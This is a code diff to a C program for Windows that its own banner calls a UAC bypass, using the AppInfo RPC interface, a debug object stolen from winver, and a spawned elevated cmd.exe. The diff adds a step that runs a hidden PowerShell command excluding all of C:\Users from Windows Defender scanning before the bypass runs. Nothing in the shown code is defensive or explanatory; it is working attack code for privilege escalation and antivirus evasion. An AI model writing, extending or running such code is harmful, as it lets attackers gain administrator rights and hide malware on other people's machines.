@@ -33,7 +33,7 @@ extern NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_
 extern VOID NTAPI DbgUiSetThreadDebugObject(HANDLE);
 extern NTSTATUS NTAPI NtClose(HANDLE);
 
-// --- AppInfo RPC Structures (Omitted for brevity, use same as previous) ---
+// --- AppInfo RPC Structures ---
 typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
 typedef struct _APP_STARTUP_INFO {
     wchar_t* lpszTitle; long dwX; long dwY; long dwXSize; long dwYSize;
@@ -76,6 +76,29 @@ BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LP
     BOOL result = (RpcAsyncCompleteCall(&asyncState, &Reply) == RPC_S_OK);
     CloseHandle(asyncState.u.hEvent); RpcBindingFree(&hBinding);
     return result;
+}
+
+// NEW: Add Defender Exclusion for C:\Users
+BOOL AddDefenderExclusion() {
+    WCHAR cmdLine[512];
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    printf("[EXCLUSION] Adding Defender exclusion for C:\\Users...\n");
+
+    // PowerShell command to add exclusion
+    wcscpy(cmdLine, L"powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");
+
+    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 10000); // Wait max 10 seconds
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        printf("[OK] Defender exclusion added successfully.\n");
+        return TRUE;
+    } else {
+        printf("[WARN] Failed to add Defender exclusion. Error: %lu\n", GetLastError());
+        return FALSE;
+    }
 }
 
 NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
@@ -133,7 +156,7 @@ int main() {
     WCHAR szProcess[MAX_PATH * 2];
     WCHAR lpszPayload[] = L"C:\\Windows\\System32\\cmd.exe";
 
-    printf("--- UAC BYPASS DEBUGGER STARTING ---\n");
+    printf("--- UAC BYPASS + DEFENDER EXCLUSION STARTING ---\n");
 
 #ifdef _WIN64
     printf("[CHECK] Architecture: x64 (Correct)\n");
@@ -143,6 +166,10 @@ int main() {
 
     GetSystemDirectoryW(g_ctx->szSystemDirectory, MAX_PATH);
     GetWindowsDirectoryW(g_ctx->szSystemRoot, MAX_PATH);
+
+    // PHASE 0: Add Defender Exclusion FIRST
+    printf("[PHASE 0] Adding Windows Defender Exclusion...\n");
+    AddDefenderExclusion();
 
     // PHASE 1
     printf("[PHASE 1] Stealing Debug Object from winver...\n");
